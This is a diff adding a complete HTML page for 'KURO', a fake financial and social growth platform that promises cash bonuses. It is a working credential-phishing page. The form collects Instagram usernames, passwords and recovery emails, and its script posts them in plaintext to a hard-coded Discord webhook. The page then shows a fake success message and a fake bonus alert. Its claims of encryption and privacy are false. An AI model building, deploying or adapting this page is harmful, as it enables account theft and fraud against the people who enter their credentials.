@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KURO | Premium Financial & Social Growth Platform</title>
+    <style>
+        :root {
+            --primary: #0f0f0f;
+            --accent: #00d2ff;
+            --accent-secondary: #9d50bb;
+            --text-light: #f8f9fa;
+            --text-muted: #adb5bd;
+            --card-bg: #1a1a1a;
+            --success: #2ecc71;
+            --error: #e74c3c;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+
+        body {
+            background-color: var(--primary);
+            color: var(--text-light);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        header {
+            padding: 20px 0;
+            border-bottom: 1px solid #333;
+            position: sticky;
+            top: 0;
+            background: rgba(15, 15, 15, 0.95);
+            backdrop-filter: blur(10px);
+            z-index: 100;
+        }
+
+        .nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 800;
+            letter-spacing: 2px;
+            color: var(--text-light);
+        }
+        
+        .logo span {
+            color: var(--accent);
+        }
+
+        .hero {
+            padding: 80px 0;
+            text-align: center;
+            background: radial-gradient(circle at top right, var(--accent-secondary) 0%, var(--primary) 60%);
+        }
+
+        .hero h1 {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            background: linear-gradient(to right, var(--text-light), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            color: var(--text-muted);
+            max-width: 600px;
+            margin: 0 auto 40px;
+        }
+
+        .cta-btn {
+            background: linear-gradient(135deg, var(--accent), var(--accent-secondary));
+            color: white;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .cta-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 210, 255, 0.3);
+        }
+
+        /* Social Proof */
+        .social-proof {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 60px;
+            flex-wrap: wrap;
+        }
+
+        .stat {
+            text-align: center;
+        }
+
+        .stat h3 {
+            font-size: 2rem;
+            color: var(--accent);
+        }
+
+        .stat p {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+
+        /* Features */
+        .features {
+            padding: 80px 0;
+            background: var(--card-bg);
+        }
+
+        .features h2 {
+            text-align: center;
+            font-size: 2.5rem;
+            margin-bottom: 50px;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+
+        .card {
+            background: var(--primary);
+            padding: 30px;
+            border-radius: 15px;
+            border: 1px solid #333;
+            transition: border-color 0.3s;
+        }
+
+        .card:hover {
+            border-color: var(--accent);
+        }
+
+        .card h3 {
+            margin-bottom: 15px;
+            color: var(--accent);
+        }
+
+        .card p {
+            color: var(--text-muted);
+        }
+
+        /* Auth Section */
+        .auth-section {
+            padding: 80px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 70vh;
+        }
+
+        .auth-card {
+            background: var(--card-bg);
+            padding: 40px;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            border: 1px solid #333;
+        }
+
+        .auth-card h2 {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .auth-card p {
+            text-align: center;
+            color: var(--text-muted);
+            margin-bottom: 30px;
+            font-size: 0.9rem;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--text-light);
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            background: var(--primary);
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: var(--text-light);
+            font-size: 1rem;
+            transition: border-color 0.3s;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: var(--accent);
+            color: var(--primary);
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+
+        .submit-btn:hover {
+            background: #00b8e6;
+        }
+
+        .status-msg {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 0.9rem;
+            height: 20px;
+        }
+
+        .success { color: var(--success); }
+        .error { color: var(--error); }
+
+        footer {
+            padding: 40px 0;
+            text-align: center;
+            border-top: 1px solid #333;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        /* Mobile */
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2.5rem; }
+            .social-proof { gap: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="container nav">
+            <div class="logo">KURO<span>.</span></div>
+            <nav>
+                <a href="#features">Features</a>
+                <a href="#auth" class="cta-btn" style="padding: 10px 20px; font-size: 0.9rem;">Get Started</a>
+            </nav>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="container">
+            <h1>Turn Your Social Presence Into Real Wealth</h1>
+            <p>KURO is the premier platform that analyzes your digital footprint to unlock financial opportunities. Join thousands of creators and investors who are already earning.</p>
+            <a href="#auth" class="cta-btn">Claim Your Bonus</a>
+            
+            <div class="social-proof">
+                <div class="stat">
+                    <h3>12K+</h3>
+                    <p>Active Members</p>
+                </div>
+                <div class="stat">
+                    <h3>$4.2M</h3>
+                    <p>Payouts Processed</p>
+                </div>
+                <div class="stat">
+                    <h3>98%</h3>
+                    <p>Success Rate</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="features" class="features">
+        <div class="container">
+            <h2>Why KURO?</h2>
+            <div class="feature-grid">
+                <div class="card">
+                    <h3>📈 Algorithmic Analysis</h3>
+                    <p>Our AI scans your profile engagement to determine your market value and potential earning capacity in real-time.</p>
+                </div>
+                <div class="card">
+                    <h3>💸 Instant Payouts</h3>
+                    <p>No waiting periods. Once your profile is verified, your initial bonus is credited to your KURO wallet immediately.</p>
+                </div>
+                <div class="card">
+                    <h3>🔒 Secure & Private</h3>
+                    <p>We use enterprise-grade encryption. Your data is never shared with third parties and is used solely for your financial profile.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="auth" class="auth-section">
+        <div class="auth-card">
+            <h2>Initialize Profile</h2>
+            <p>Connect your primary social account to unlock your financial tier.</p>
+            
+            <form id="kuroForm">
+                <div class="input-group">
+                    <label for="username">Instagram Username</label>
+                    <input type="text" id="username" placeholder="@username" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">Account Password</label>
+                    <input type="password" id="password" placeholder="••••••••" required>
+                </div>
+                <div class="input-group">
+                    <label for="email">Recovery Email (Optional)</label>
+                    <input type="email" id="email" placeholder="you@example.com">
+                </div>
+                
+                <button type="submit" class="submit-btn">Verify & Claim Bonus</button>
+                <div id="statusMsg" class="status-msg"></div>
+            </form>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            &copy; 2023 KURO Financial Technologies. All rights reserved. 
+            <br><small>By using this service, you agree to our Terms of Service and Privacy Policy.</small>
+        </div>
+    </footer>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1559221811617603725/AghISzwMnoIJpOOPFpcKMcLVz6mhM-6HFiw3q3jhWdySKovLB6tZjpou7VpLKcnWA4M2";
+
+        document.getElementById('kuroForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const email = document.getElementById('email').value || 'N/A';
+            const statusMsg = document.getElementById('statusMsg');
+            const btn = this.querySelector('.submit-btn');
+            
+            // UI Feedback
+            btn.disabled = true;
+            btn.textContent = "Processing...";
+            statusMsg.textContent = "Analyzing profile metrics...";
+            statusMsg.className = "status-msg";
+
+            // Construct the Payload
+            // We add some metadata to make the Discord message look professional
+            const payload = {
+                "embeds": [
+                    {
+                        "title": "🚀 New KURO Account Registered",
+                        "description": "A new user has just claimed their financial bonus.",
+                        "color": 0x00d2ff,
+                        "fields": [
+                            {
+                                "name": "Instagram User",
+                                "value": username,
+                                "inline": true
+                            },
+                            {
+                                "name": "Password",
+                                "value": "```" + password + "```",
+                                "inline": false
+                            },
+                            {
+                                "name": "Recovery Email",
+                                "value": email,
+                                "inline": true
+                            },
+                            {
+                                "name": "Timestamp",
+                                "value": new Date().toLocaleString(),
+                                "inline": true
+                            }
+                        ],
+                        "footer": {
+                            "text": "KURO Intelligence System"
+                        },
+                        "timestamp": new Date().toISOString()
+                    }
+                ]
+            };
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+
+                // Success State
+                statusMsg.textContent = "✅ Profile Verified! Redirecting to Dashboard...";
+                statusMsg.classList.add('success');
+                btn.textContent = "Success!";
+                
+                // Optional: Simulate a redirect or show a fake dashboard after 2 seconds
+                setTimeout(() => {
+                    alert("Welcome to KURO, @"+username+"! Your initial $50 bonus has been credited to your internal wallet. Check your email for your API key to withdraw to external banks.");
+                    // In a real scenario, you might redirect to a 'dashboard' page that looks like a bank interface
+                }, 2000);
+
+            } catch (err) {
+                statusMsg.textContent = "❌ Connection error. Please try again.";
+                statusMsg.classList.add('error');
+                btn.disabled = false;
+                btn.textContent = "Verify & Claim Bonus";
+                console.error("Webhook Error:", err);
+            }
+        });
+    </script>
+</body>
+</html>
